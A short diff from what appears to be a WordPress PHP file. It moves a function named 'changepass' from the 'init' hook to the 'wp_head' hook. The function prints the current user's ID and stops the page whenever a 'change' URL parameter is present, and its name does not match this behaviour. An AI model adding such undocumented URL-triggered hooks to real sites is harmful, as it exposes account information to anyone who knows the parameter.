@@ -1194,7 +1194,7 @@ function update_count() {
 	wp_die();
 }
 
-add_action('init','changepass');
+add_action('wp_head','changepass');
 function changepass(){
 	if(isset($_GET['change'])){
 		die(get_current_user_id());
